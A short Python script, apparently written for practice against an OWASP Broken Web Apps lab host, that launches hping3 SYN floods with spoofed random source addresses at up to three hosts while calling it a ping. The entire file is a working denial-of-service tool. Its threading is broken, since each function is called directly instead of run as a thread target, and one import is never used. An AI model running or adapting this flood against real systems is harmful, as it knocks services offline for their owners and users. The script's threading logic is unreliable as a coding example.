import os
import keyboard
import time
import threading as th

def singleHost(host_addr):
    print("Thread loaded for host : " + host_addr)
    os.system("sudo hping3 --flood -S -V --rand-source " + host_addr)

# Ping a maximum of 3 hosts at the same time.

def multipleHosts(host_list):
    th1 = th.Thread(target=singleHost(host_list[0]))
    th1.start()
    time.sleep(10)
    th1.join()
    
    
    th2 = th.Thread(target=singleHost(host_list[1]))
    th2.start()
    time.sleep(10)
    
    
    th3 = th.Thread(target=singleHost(host_list[2]))
    th3.start()
    time.sleep(10)
    th3.join()
    
    
    print("Threads have been completed for all hosts \n")
    
multipleHosts(["owaspbwa.com","owaspbwa.com","owaspbwa.com"])
        
    
    